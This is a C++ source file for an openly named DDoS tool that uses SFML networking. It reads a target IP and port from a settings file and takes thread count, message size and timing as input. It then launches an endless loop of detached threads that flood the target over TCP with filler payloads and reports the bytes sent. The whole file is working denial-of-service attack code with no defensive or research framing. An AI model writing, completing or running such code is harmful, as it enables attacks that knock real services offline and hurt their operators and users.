#include <SFML/Network.hpp>
#include <iostream>
#include <string>
#include <thread>
#include <Windows.h>
#include <vector>
#include <fstream>
#include <regex>
#include "DDoS.h"

int main()
{
    {
        std::string ip_string = "";
        std::string port_string = "";
        int port = -1;
        std::ifstream file("ddos_settings.txt");
        if (!file.is_open())
        {
            std::cerr << "Failed to open the file." << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(5));
            return -1;
        }
        std::string file_string = "";
        std::getline(file, file_string);

        std::regex file_regex(R"((\d{1,3}(?:\.\d{1,3}){3}):(\d+))");
        std::smatch matches;
        if (std::regex_match(file_string, matches, file_regex))
        {
            ip_string = matches[1];
            port_string = matches[2];

            std::cout << "IP: " << ip_string << "\nPort: " << port_string << std::endl;
        }
        else
        {
            std::cerr << "Invalid format. Expected IP:PORT format.\n";
            std::this_thread::sleep_for(std::chrono::seconds(5));
            return -2;
        }

        port = std::stoi(port_string);

        Client::ip_address = sf::IpAddress(ip_string);
        Client::port = port;

        std::cout << "Client::DDoS_thread_count: ";
        std::cin >> Client::DDoS_thread_count;

        std::cout << "Client::DDoS_message_count: ";
        std::cin >> Client::DDoS_message_count;

        std::cout << "Client::DDoS_message_length: ";
        std::cin >> Client::DDoS_message_length;

        int DDoS_waiting_time = 0;
        std::cout << "Client::DDoS_waiting_time: ";
        std::cin >> DDoS_waiting_time;
        Client::DDoS_waiting_time = sf::milliseconds(DDoS_waiting_time);

        Client::message_sockets.resize(Client::DDoS_thread_count);
        for (size_t i = 0; i < Client::DDoS_thread_count; i++)
        {
            Client::message_sockets[i] = new sf::TcpSocket();
        }
        std::string _DDoS_message = std::string(Client::DDoS_message_length, 'a');
        _DDoS_message += '\0';
        Client::DDoS_message.append(_DDoS_message.c_str(), _DDoS_message.size());
        Client::DDoS_threads = new std::thread[Client::DDoS_thread_count];
        Client::DDoS_threads_atomic_flag = new std::atomic<bool>[Client::DDoS_thread_count];
        for (size_t i = 0; i < Client::DDoS_thread_count; i++)
        {
            Client::DDoS_threads_atomic_flag[i] = false;
        }
        Client::DDoS_total_packet_sended = 0;
    }
    while (true)
    {
        for (size_t i = 0; i < Client::DDoS_thread_count; i++)
        {
            if (Client::DDoS_threads_atomic_flag[i] == false)
            {
                Client::DDoS_threads[i] = std::thread(Client::client_loop, i);
                Client::DDoS_threads[i].detach();
            }
        }
        std::cout << "Loop Ended: Client::DDoS_total_packet_sended = " << Client::DDoS_total_packet_sended << " Bytes" << std::endl;
    }
    delete[] Client::DDoS_threads;
    return 0;
}